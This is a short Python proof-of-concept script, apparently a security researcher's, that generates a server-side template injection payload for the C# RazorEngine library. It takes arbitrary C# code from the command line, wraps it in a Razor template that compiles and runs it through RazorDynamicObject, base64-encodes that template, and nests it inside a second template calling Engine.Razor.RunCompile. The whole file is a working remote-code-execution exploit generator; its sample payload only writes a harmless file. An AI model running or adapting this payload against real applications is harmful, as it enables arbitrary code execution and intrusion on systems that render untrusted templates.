#!/usr/bin/env python3

import sys
import base64

if len(sys.argv) == 1:
    print("Usage: poc.py \"<payload>\"")
    print("  poc.py \"System.IO.File.WriteAllText(\\\"rce.txt\\\", \\\"Hello World\\\")\"")
    print("  poc.py \'System.IO.File.WriteAllText(\"rce.txt\", \"Hello World\")\'")
    sys.exit()

CODE = sys.argv[1]

initial_template = f"""
    @using System.IO
    @using RC = RazorEngine.Compilation
    @{{ 
        System.Linq.Expressions.Expression<System.Action> exp = () => {CODE}
        dynamic d = (RC.RazorDynamicObject)RC.RazorDynamicObject.Create(exp);
        System.Action a = d.Compile();
        a();
    }}
"""

# An encoded version of the above to prevent issues with <> or other characters in the input
base64_bytes = initial_template.encode('utf-8')
base64_string = base64.b64encode(base64_bytes).decode('utf-8')
print(f"base64 encoded payload: {base64_string}")

nested_template = f"""
    @using RazorEngine;
    @using RazorEngine.Templating;
    @{{ 
        var base64EncodedBytes = System.Convert.FromBase64String("{base64_string}");
        var template = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        var result = Engine.Razor.RunCompile(template, "poc", null, new {{ N = "empty" }});
    }}
"""

print("Template:")
print(nested_template)
